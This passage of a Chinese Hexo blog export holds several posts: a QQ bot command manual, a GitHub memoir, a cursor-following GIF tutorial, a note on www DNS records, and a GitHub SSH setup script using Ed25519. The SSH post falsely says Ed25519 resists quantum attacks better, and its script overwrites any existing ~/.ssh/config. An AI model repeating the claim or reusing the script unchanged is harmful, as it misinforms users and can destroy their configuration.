<h3 id="群词云功能使用手册"><a href="#群词云功能使用手册" class="headerlink" title="群词云功能使用手册"></a>群词云功能使用手册</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>wcon</code></td>
<td>开启词云统计功能，开始记录群内所有聊天并汇总分词。</td>
<td><code>wcon</code></td>
</tr>
<tr>
<td><code>wcoff</code></td>
<td>关闭词云统计功能，停止记录群内聊天。</td>
<td><code>wcoff</code></td>
</tr>
<tr>
<td><code>今日词云</code></td>
<td>绘制并发送当天的词云图。</td>
<td><code>今日词云</code></td>
</tr>
<tr>
<td><code>wordcloud</code></td>
<td>显示词云功能菜单，介绍词云功能及相关命令。</td>
<td><code>wordcloud</code></td>
</tr>
</tbody></table>
<h4 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>开启词云统计</strong>: 在群聊中发送 <code>wcon</code>，将会收到确认消息，表示词云统计已开启。</li>
<li><strong>关闭词云统计</strong>: 在群聊中发送 <code>wcoff</code>，将会收到确认消息，表示词云统计已关闭。</li>
<li><strong>获取今日词云</strong>: 在群聊中发送 <code>今日词云</code>，如果有数据，将会收到当天的词云图。</li>
<li><strong>查看词云菜单</strong>: 在群聊中发送 <code>wordcloud</code>，将会收到词云功能的详细菜单说明。</li>
</ul>
<h3 id="哔哩哔哩直播动态监控（BilibiliPush）使用手册"><a href="#哔哩哔哩直播动态监控（BilibiliPush）使用手册" class="headerlink" title="哔哩哔哩直播动态监控（BilibiliPush）使用手册"></a>哔哩哔哩直播动态监控（BilibiliPush）使用手册</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>哔哩哔哩直播动态监控是卷卷 bot 的一个功能，可以监控哔哩哔哩直播动态，并将其推送到指定群。</p>
<p>开源地址：<a class="link"   href="https://github.com/W1ndysBot/BilibiliPush#/" >https://github.com/W1ndysBot/BilibiliPush#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><p>| 命令 | 描述 | 示例 |<br>| bilipush | 开启或关闭哔哩哔哩直播动态监控 | bilipush |<br>| 订阅动态 xxx | 订阅动态 uid | bilipushuid 123456 |<br>| 取消订阅动态 xxx | 取消订阅动态 uid | bilipushuid 123456 |<br>| 订阅直播 xxx | 订阅直播 uid | bilipushlive 123456 |<br>| 取消订阅直播 xxx | 取消订阅直播 uid | bilipushlive 123456 |<br>| 查询订阅 | 查询订阅动态或直播 | bilipushuid |</p>
<h3 id="群互联（GroupLink）使用手册"><a href="#群互联（GroupLink）使用手册" class="headerlink" title="群互联（GroupLink）使用手册"></a>群互联（GroupLink）使用手册</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>群互联是卷卷 bot 的一个功能，可以实现多个群之间的消息互通。互联起来的群，当一个群有消息时，会向其他群转发。</p>
<p>开源地址：<a class="link"   href="https://github.com/W1ndysBot/GroupLink#/" >https://github.com/W1ndysBot/GroupLink#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h4><p>| 命令 | 描述 | 示例 |<br>| gl 开或关 | 开启或关闭群互联 | gl 开或关 |<br>| add 互联 | 添加互联群 | add 互联 |<br>| rm 互联 | 删除互联群 | rm 互联 |</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>回忆我的Github</title>
    <url>/posts/471190f.html</url>
    <content><![CDATA[<h1 id="回忆我的-Github"><a href="#回忆我的-Github" class="headerlink" title="回忆我的 Github"></a>回忆我的 Github</h1><p>今天晚上突然想整顿一下自己的 Github pages，把以前的博客清算一下，不知怎么的就开始回忆了，给 Github 写了一大段小作文。</p>
<p>用 Github Pages 搭建博客已经有一段时间了，一共写了 120 多篇文章，其中有些是技术文章，有些是生活感悟，也有些是随笔。</p>
<p>也记录了选课指北和速通指南，起初这些只是一个普通的 README，后来开发了 2.0 版本，并且改名为 <a class="link"   href="https://ezqfnu.w1ndys.top/" >Easy-QFNU<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，已经成为一个正式的文档站。</p>
<p>从最开始的看教程搭建博客，搞了三整天，还跟我妈咪炫耀，说我做了一个网站（实际上也是 <strong>搬运工</strong> 吧），到现在写过无数脚本（什么你写的，实际上都是 <strong>ChatGPT</strong> 写的吧）来提高工作效率，也实现了源码+静态页面同时备份，实现多端同步，也有了很多收获，也有很多想法。<strong>还帮我的同学，教同学搭建了自己的 Hexo 博客</strong></p>
<p>在这期间，我对 Github 也有了更深的了解</p>
<h2 id="2022-2023-年-Github-生涯"><a href="#2022-2023-年-Github-生涯" class="headerlink" title="2022&#x2F;2023 年 Github 生涯"></a>2022&#x2F;2023 年 Github 生涯</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github/image-20240407202632474.png"
                      alt="image-20240407202632474"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github/image-20240407202707234.png"
                      alt="image-20240407202707234"
                ></p>
<p>为什么我要把 22 年和 23 年放在一起说呢，因为我这两年时间还不如 24 年三天的活动多。没啥好回忆的。</p>
<p>回望过去，2022 年 7 月 16 日，我第一次加入 Github, 那时候还是个小白，啥也不懂，也不懂什么是源代码托管。</p>
<p>2023 年 07 月 03 日，我创建了我的第一个 repo，那时候还不是代码，我只是写了一个 README，用来收集常用的网站。</p>
<p>2023 年 07 月 22 日我发出了我的第一个 <a class="link"   href="https://github.com/goldze/Anti-Android-KM/issues/7" >issues<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，没想到那竟然是与安卓逆向相关的，我已经没有任何印象了。</p>
<p>2023 年 07 月 28 日，创建了算是自己的第一个代码仓库，是我写的用 C++演奏音乐，演奏的 <a class="link"   href="https://github.com/W1ndys/QFNU_music" >犁牛之子歌<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，当时还给校新媒体的师姐沟通，发到曲师大官方抖音了，看的人其实也不多，<font color=orange> 毕竟也不是什么能吸引人的东西 </font>。</p>
<p>2023 年 09 月 11 日，在 fluid 仓库里发了一个 <a class="link"   href="https://github.com/fluid-dev/hexo-theme-fluid/issues/1003#/" >issues<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，那应该是我真正了解什么是 issues 之后的第一个 issues。</p>
<p>2023 年 12 月 03 日，我开始尝试使用 ChatGPT 写脚本来提高我的日常工作效率，生成了第一个脚本，<a class="link"   href="https://github.com/W1ndys/1to9-image" >九宫格切图<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，并开源到了 Github。</p>
<p>2023 年 12 月 10 日，我在统计表格的时候突发奇想，既然我做的都是机械化的工作，能不能用脚本来提高效率，于是我上传了我第二个脚本，<a class="link"   href="https://github.com/W1ndys/Excel-date-update/" >Excel 日期更新<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>我 2023 年的 Github 生涯已经基本接近尾声了。</p>
<h2 id="2024-年-Github-生涯"><a href="#2024-年-Github-生涯" class="headerlink" title="2024 年 Github 生涯"></a>2024 年 Github 生涯</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github/image-20240407203333098.png"
                      alt="image-20240407203333098"
                ></p>
<div style="text-align: center;">
  <span style="color: #FF1493;">1314次，还挺浪漫的</span>
</div>

<p>真正让我对 Github 了解程度突飞猛进的时间是 2023-2024 年的寒假。因为我本来就打算换博客主题了，但是没想到两个主题的依赖有冲突，这让我不得不删库，重新建立博客，于是我又重新开始了我的博客之旅。从安装 Hexo 到配置主题，到部署，再到域名绑定，到评论系统的切换，到网站的镜像备份，我花了大量的时间，部署完毕之后还有一大堆 bug 要修。就因为这个我整整一个月都在搞博客。</p>
<p>因此还对 <code>VScode、Typora、Git、Markdown、Github、Hexo、HTML、CSS、JavaScript</code> 等等都有了更深入的了解。</p>
<p>还记得大一刚来的时候，舍友问我 zx（某挺好的教育系统） 支不支持 Markdown，那时候我连 Markdown 是什么都不知道，根本就没听说过，但是现在我已经每天都离不开 Markdown 了，写博客，做 Easy-QFNU，全是 Markdown 和 HTML，跟吃饭一样，比吃饭还勤快，我吃饭还有时候会忘了呢。</p>
<p>2024 年 03 月 04 日，我学会了 Pull Request，第一次给公开仓库发起了 PR，还记得当时我还不知道什么是 PR，就像现在一样，我已经习惯了。</p>
<p>2024 年 04 月 03 日，第一次成功的 Pull Request，给探姬的<a class="link"   href="https://github.com/ProbiusOfficial/Hello-CTF" >Hello-CTF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>提交了两个 Pull Request，一个因为效果适配性不太好，<a class="link"   href="https://github.com/ProbiusOfficial/Hello-CTF/pull/104" >另一个<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>还行，被合并了</p>
<p>2024 年 04 月 06 日，创建了两个 Github 组织，一个是<a class="link"   href="https://github.com/QFNU-Archives" >QFNU<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，致力于收集 QFNU 的优秀 repo，一个是<a class="link"   href="https://github.com/Easy-QFNU" >Easy-QFNU<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，致力于维护 Easy-QFNU 文档站。</p>
<p>此外我还获得了几个成就，看起来还蛮好看的，还学会了调用 API 美化自己的 Github 主页，蛮不错的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Github/image-20240407205555472.png"
                      alt="image-20240407205555472"
                ></p>
<p>到此也基本结束了</p>
<p>2024 年也就这么多，等 25 年看看我整个 24 年会 commit 多少次吧。(目前最多的是我在维护 Easy-QFNU，在正式发布之前，截止到现在就已经 500+ commits 了)</p>
<p>硕神，继续努力啊！</p>
<p>别忘了你的<a href="/about/">关于</a>页面是怎么写的</p>
<p>END</p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>在你的网站中添加Capoo！（调皮的猫猫虫）</title>
    <url>/posts/3a360f71.html</url>
    <content><![CDATA[<blockquote>
<p>本教程基于 <a class="link"   href="https://docs.api.ecylt.top/kemomimi-jiang#/" >https://docs.api.ecylt.top/kemomimi-jiang#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 进行魔改</p>
</blockquote>
<h1 id="Capoo"><a href="#Capoo" class="headerlink" title="Capoo"></a>Capoo</h1><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Capoo/recording.gif"
                      alt="recording"
                ></p>
<h2 id="创建-css"><a href="#创建-css" class="headerlink" title="创建 css"></a>创建 css</h2><p>复制下面代码，创建一个名为 <code>Capoo.css</code> 的文件，代码以及参数均已加注释</p>
<div class="code-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#follow-img</span> &#123;</span><br><span class="line">    <span class="attribute">pointer-events</span>: none; <span class="comment">/* 禁止图像接受鼠标事件 */</span></span><br><span class="line">    <span class="attribute">position</span>: absolute; <span class="comment">/* 设置图像的定位方式为绝对定位，相对于其最近的具有定位属性的父元素进行定位 */</span></span><br><span class="line">    <span class="attribute">transition</span>: transform <span class="number">0.5s</span>, top <span class="number">0.5s</span>, left <span class="number">0.5s</span>; <span class="comment">/* 定义了图像在发生变化时的过渡效果，其中 transform 表示图像的旋转效果，top 表示图像的垂直移动效果，left 表示图像的水平移动效果，0.5s 表示过渡时间为0.5秒 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="创建-js"><a href="#创建-js" class="headerlink" title="创建 js"></a>创建 js</h2><p>复制下面代码，创建一个名为 <code>Capoo.js</code> 的文件</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> img = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;follow-img&#x27;</span>); <span class="comment">// 获取图像元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mouseX = <span class="number">0</span>, mouseY = <span class="number">0</span>; <span class="comment">// 鼠标的初始位置</span></span><br><span class="line"><span class="keyword">let</span> imgX = <span class="number">0</span>, imgY = <span class="number">0</span>; <span class="comment">// 图像的初始位置</span></span><br><span class="line"><span class="keyword">let</span> speed = <span class="number">0.05</span>; <span class="comment">// 图像移动的速度</span></span><br><span class="line"><span class="keyword">let</span> rotateDeg = <span class="number">0</span>; <span class="comment">// 图像的旋转角度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缩小图片大小</span></span><br><span class="line">img.<span class="property">style</span>.<span class="property">width</span> = <span class="string">&#x27;100px&#x27;</span>; <span class="comment">// 设置图像的宽度为100像素</span></span><br><span class="line">img.<span class="property">style</span>.<span class="property">height</span> = <span class="string">&#x27;auto&#x27;</span>; <span class="comment">// 保持宽高比</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">animate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> dx = mouseX - imgX; <span class="comment">// 计算鼠标在水平方向上的位移</span></span><br><span class="line">    <span class="keyword">let</span> dy = mouseY - imgY; <span class="comment">// 计算鼠标在垂直方向上的位移</span></span><br><span class="line">    <span class="keyword">let</span> angle = <span class="title class_">Math</span>.<span class="title function_">atan2</span>(dy, dx); <span class="comment">// 计算鼠标相对于图像的角度</span></span><br><span class="line">    rotateDeg = angle * (<span class="number">180</span> / <span class="title class_">Math</span>.<span class="property">PI</span>) + <span class="number">90</span>; <span class="comment">// 将弧度转换为角度，并加上90度作为旋转角度</span></span><br><span class="line"></span><br><span class="line">    imgX += dx * speed; <span class="comment">// 更新图像的水平位置</span></span><br><span class="line">    imgY += dy * speed; <span class="comment">// 更新图像的垂直位置</span></span><br><span class="line"></span><br><span class="line">    img.<span class="property">style</span>.<span class="property">left</span> = <span class="string">`<span class="subst">$&#123;imgX - img.width / <span class="number">2</span>&#125;</span>px`</span>; <span class="comment">// 设置图像相对于左边界的位置</span></span><br><span class="line">    img.<span class="property">style</span>.<span class="property">top</span> = <span class="string">`<span class="subst">$&#123;imgY - img.height / <span class="number">2</span>&#125;</span>px`</span>; <span class="comment">// 设置图像相对于上边界的位置</span></span><br><span class="line">    img.<span class="property">style</span>.<span class="property">transform</span> = <span class="string">`rotate(<span class="subst">$&#123;rotateDeg&#125;</span>deg)`</span>; <span class="comment">// 应用旋转角度</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">requestAnimationFrame</span>(animate); <span class="comment">// 循环调用动画函数，实现动画效果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    mouseX = e.<span class="property">pageX</span>; <span class="comment">// 更新鼠标的水平位置</span></span><br><span class="line">    mouseY = e.<span class="property">pageY</span>; <span class="comment">// 更新鼠标的垂直位置</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加对移动端的判断</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isMobile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">innerWidth</span> &lt;= <span class="number">768</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">innerHeight</span> &lt;= <span class="number">1024</span>; <span class="comment">// 判断是否为移动端</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">isMobile</span>()) &#123; <span class="comment">// 如果不是移动端</span></span><br><span class="line">    <span class="title function_">animate</span>(); <span class="comment">// 调用动画函数</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果是移动端</span></span><br><span class="line">    img.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>; <span class="comment">// 隐藏图像</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="创建-GIF"><a href="#创建-GIF" class="headerlink" title="创建 GIF"></a>创建 GIF</h2><p>保存这个 GIF 图片到你的 source 合适的位置</p>
<p>此处不限类型，只要是图片都可以，jpg，png 等</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Capoo/Capoo.gif"
                     
                ></p>
<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>在你的主题中引入这三个文件，比如我的</p>
<p>注意，<code>css</code> 文件一定要引入在 <code>head</code> 前面，另外两个任意都行，<code>head</code> 或者 <code>body</code> 都行</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/css/Capoo.css&quot;&gt;</span><br><span class="line">- &lt;img id=&quot;follow-img&quot; src=&quot;../images/Capoo/Capoo.gif&quot;/&gt;</span><br><span class="line">- &lt;script src=&quot;/js/Capoo.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>同理你也可以把图片文件换成自己喜欢的小图片</p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Hexo美化</tag>
        <tag>butterfly美化</tag>
      </tags>
  </entry>
  <entry>
    <title>域名配置中 www 的两种实现方式详解</title>
    <url>/posts/8f735965.html</url>
    <content><![CDATA[
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>本文内容包含 AI 生成，仅供参考。</p>

    </div>
  </div>

<p>在网站部署中，我们经常会遇到有关域名配置的问题，其中比较常见的一点是关于 <strong><code>www</code> 开头的域名</strong> 该如何配置。它既可以作为根域名的一个记录值，也可以作为一个独立的子域名使用。本文将详细解释这两种配置方式的区别及适用场景，帮助你选择适合自己项目的方案。</p>
<hr>
<h2 id="1-在根域名添加-www-开头的记录值"><a href="#1-在根域名添加-www-开头的记录值" class="headerlink" title="1. 在根域名添加 www 开头的记录值"></a>1. 在根域名添加 <code>www</code> 开头的记录值</h2><p>这种方式是通过在根域名（例如 <code>example.com</code>）的 DNS 设置中添加一条 <code>www</code> 开头的记录实现的。</p>
<h3 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h3><p>通常需要在 DNS 控制台中添加如下记录：</p>
<ul>
<li><strong>主机记录（Host）：</strong> <code>www</code></li>
<li><strong>记录类型（Type）：</strong> <code>A</code>（解析到 IP 地址）或 <code>CNAME</code>（指向另一个域名）</li>
<li><strong>记录值（Value）：</strong> 指向的服务器 IP 或目标域名</li>
</ul>
<p>例如，配置如下记录后，用户访问 <code>www.example.com</code> 时会被解析到 <code>192.168.1.1</code>：</p>
<table>
<thead>
<tr>
<th>主机记录</th>
<th>记录类型</th>
<th>记录值</th>
</tr>
</thead>
<tbody><tr>
<td>www</td>
<td>A</td>
<td>192.168.1.1</td>
</tr>
</tbody></table>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
<li><code>www</code> 是根域名的一个主机记录，并非真正的子域名。</li>
<li>一般用于将 <code>www.example.com</code> 指向与 <code>example.com</code> 相同的服务器。</li>
<li>适合需要简化配置、统一指向的场景。</li>
</ul>
<hr>
<h2 id="2-添加一个-www-开头的子域名"><a href="#2-添加一个-www-开头的子域名" class="headerlink" title="2. 添加一个 www 开头的子域名"></a>2. 添加一个 <code>www</code> 开头的子域名</h2><p>另一种方式是将 <code>www</code> 配置为一个独立的子域名，与其他子域名（例如 <code>api.example.com</code> 或 <code>blog.example.com</code>）具有相同的地位。</p>
<h3 id="配置方法-1"><a href="#配置方法-1" class="headerlink" title="配置方法"></a>配置方法</h3><p>在 DNS 控制台中添加如下记录：</p>
<ul>
<li><strong>主机记录（Host）：</strong> <code>www</code></li>
<li><strong>记录类型（Type）：</strong> 根据需要选择 <code>A</code> 或 <code>CNAME</code></li>
<li><strong>记录值（Value）：</strong> 可指向独立的服务器或服务</li>
</ul>
<p>例如：</p>
<table>
<thead>
<tr>
<th>主机记录</th>
<th>记录类型</th>
<th>记录值</th>
</tr>
</thead>
<tbody><tr>
<td>www</td>
<td>CNAME</td>
<td>cdn.example-cdn.com</td>
</tr>
</tbody></table>
<h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ul>
<li><code>www</code> 被视为独立的子域名，和其他子域名地位相同。</li>
<li>可以指向完全不同的服务器或服务，适合更灵活的场景。</li>
<li>常用于将 <code>www</code> 子域名用于独立的站点部署、CDN 加速或负载均衡等。</li>
</ul>
<hr>
<h2 id="3-两种方式的区别对比"><a href="#3-两种方式的区别对比" class="headerlink" title="3. 两种方式的区别对比"></a>3. 两种方式的区别对比</h2><table>
<thead>
<tr>
<th><strong>区别点</strong></th>
<th><strong>根域名添加 <code>www</code> 记录值</strong></th>
<th><strong>创建独立的 <code>www</code> 子域名</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>www</code> 的作用</strong></td>
<td>根域名的一个主机记录，通常指向同一服务器</td>
<td>独立子域名，可用于不同用途</td>
</tr>
<tr>
<td><strong>灵活性</strong></td>
<td>灵活性较低，适用于统一解析</td>
<td>灵活性更高，可独立配置</td>
</tr>
<tr>
<td><strong>是否独立</strong></td>
<td>不独立，与根域名紧密关联</td>
<td>独立子域名，可完全分离</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>通常用于简单的站点配置，例如统一指向一个站点</td>
<td>用于特殊需求，例如独立站点或 CDN 加速</td>
</tr>
</tbody></table>
<hr>
<h2 id="4-如何选择适合自己的配置？"><a href="#4-如何选择适合自己的配置？" class="headerlink" title="4. 如何选择适合自己的配置？"></a>4. 如何选择适合自己的配置？</h2><p>选择合适的配置方式主要取决于项目需求：</p>
<ul>
<li><p><strong>如果 <code>www</code> 和根域名指向相同服务：</strong><br>推荐在根域名添加 <code>www</code> 开头的记录值，这种方式简单且高效，适合大部分常规网站。</p>
</li>
<li><p><strong>如果需要为 <code>www</code> 子域名配置不同服务：</strong><br>推荐将 <code>www</code> 配置为独立子域名，尤其是当你需要为 <code>www</code> 启用 CDN 加速、负载均衡或托管在不同服务器时。</p>
</li>
</ul>
<hr>
<h2 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h2><p>无论选择哪种方式，<code>www</code> 的配置都需要根据项目的具体需求来定。如果只是一个普通的网站，直接通过根域名添加 <code>www</code> 开头的记录值即可满足需求；但如果你的项目对子域名有更多功能和用途需求，那么将 <code>www</code> 配置为独立子域名则会更适合。</p>
<p>希望本文能帮助你更好地理解和配置域名中的 <code>www</code>！如果你有其他域名配置相关的问题，欢迎留言讨论 😊。</p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>域名配置</tag>
        <tag>网站部署</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Ed25519算法的配置Github SSH的shell脚本</title>
    <url>/posts/65dfe81d.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在使用 GitHub 时，SSH 是一种更安全和便捷的认证方式。本文将介绍一个基于 Ed25519 算法的 GitHub SSH 配置脚本，并详细解释为什么选择 Ed25519 算法。</p>
<h2 id="为什么选择-Ed25519？"><a href="#为什么选择-Ed25519？" class="headerlink" title="为什么选择 Ed25519？"></a>为什么选择 Ed25519？</h2><p>Ed25519 是现代密码学中最受推荐的算法之一，相比传统的 RSA 算法具有以下优势：</p>
<h3 id="1-更高的安全性"><a href="#1-更高的安全性" class="headerlink" title="1. 更高的安全性"></a>1. 更高的安全性</h3><ul>
<li>基于 Edwards-curve Digital Signature Algorithm (EdDSA)</li>
<li>256 位密钥长度就能提供与 RSA-4096 相当的安全性</li>
<li>对量子计算攻击具有更好的抵抗性</li>
</ul>
<h3 id="2-卓越的性能"><a href="#2-卓越的性能" class="headerlink" title="2. 卓越的性能"></a>2. 卓越的性能</h3><ul>
<li>密钥生成速度快</li>
<li>签名和验证效率高</li>
<li>资源消耗低</li>
</ul>
<h3 id="3-简洁的密钥长度"><a href="#3-简洁的密钥长度" class="headerlink" title="3. 简洁的密钥长度"></a>3. 简洁的密钥长度</h3><ul>
<li>公钥仅 68 字节</li>
<li>私钥仅 32 字节</li>
<li>大大简化了密钥的管理和传输</li>
</ul>
<h2 id="配置脚本"><a href="#配置脚本" class="headerlink" title="配置脚本"></a>配置脚本</h2><p>以下是一个完整的 GitHub SSH 配置脚本：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置颜色输出</span></span><br><span class="line">GREEN=&#x27;\033[0;32m&#x27;</span><br><span class="line">RED=&#x27;\033[0;31m&#x27;</span><br><span class="line">NC=&#x27;\033[0m&#x27; # No Color</span><br><span class="line"></span><br><span class="line">echo -e &quot;$&#123;GREEN&#125;开始配置 GitHub SSH 连接$&#123;NC&#125;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查是否存在 SSH 密钥</span></span><br><span class="line">if [ ! -f ~/.ssh/id_ed25519 ]; then</span><br><span class="line">    echo &quot;未找到现有的 SSH 密钥，正在生成新的密钥...&quot;</span><br><span class="line">    read -p &quot;请输入你的 GitHub 邮箱: &quot; email</span><br><span class="line">    ssh-keygen -t ed25519 -C &quot;$email&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;已找到现有的 SSH 密钥&quot;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确保 SSH 代理正在运行</span></span><br><span class="line">eval &quot;$(ssh-agent -s)&quot;</span><br><span class="line">ssh-add ~/.ssh/id_ed25519</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建或更新 SSH 配置</span></span><br><span class="line">mkdir -p ~/.ssh</span><br><span class="line">cat &gt; ~/.ssh/config &lt;&lt; EOL</span><br><span class="line">Host github.com</span><br><span class="line">    Hostname ssh.github.com</span><br><span class="line">    Port 443</span><br><span class="line">    User git</span><br><span class="line">EOL</span><br><span class="line"></span><br><span class="line">echo -e &quot;$&#123;GREEN&#125;SSH 配置已更新$&#123;NC&#125;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示公钥</span></span><br><span class="line">echo -e &quot;\n$&#123;GREEN&#125;以下是你的 SSH 公钥，请将其添加到 GitHub：$&#123;NC&#125;&quot;</span><br><span class="line">cat ~/.ssh/id_ed25519.pub</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试连接</span></span><br><span class="line">echo -e &quot;\n$&#123;GREEN&#125;正在测试 GitHub 连接...$&#123;NC&#125;&quot;</span><br><span class="line">ssh -T git@github.com</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n$&#123;GREEN&#125;配置完成！$&#123;NC&#125;&quot;</span><br><span class="line">echo &quot;如果上面显示 &#x27;Hi username! You&#x27;ve successfully authenticated&#x27; 则表示配置成功&quot; </span><br></pre></td></tr></table></figure></div>

<h2 id="脚本功能说明"><a href="#脚本功能说明" class="headerlink" title="脚本功能说明"></a>脚本功能说明</h2><ol>
<li><p><strong>密钥检查与生成</strong></p>
<ul>
<li>检查是否存在现有的 Ed25519 密钥</li>
<li>如果不存在，则生成新的密钥对</li>
</ul>
</li>
<li><p><strong>SSH 代理配置</strong></p>
<ul>
<li>启动 SSH 代理</li>
<li>添加私钥到 SSH 代理</li>
</ul>
</li>
<li><p><strong>特殊网络环境适配</strong></p>
<ul>
<li>使用 443 端口替代默认的 22 端口</li>
<li>适配中国大陆网络环境</li>
</ul>
</li>
<li><p><strong>自动化配置</strong></p>
<ul>
<li>自动创建和配置 SSH 配置文件</li>
<li>提供即时的连接测试</li>
</ul>
</li>
</ol>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ol>
<li>创建脚本文件：</li>
<li>复制上述脚本内容到文件中</li>
<li>运行脚本：</li>
<li>按照提示将公钥添加到 GitHub 设置中</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
<li>运行脚本前确保已安装 <code>ssh-keygen</code> 和 <code>ssh-agent</code></li>
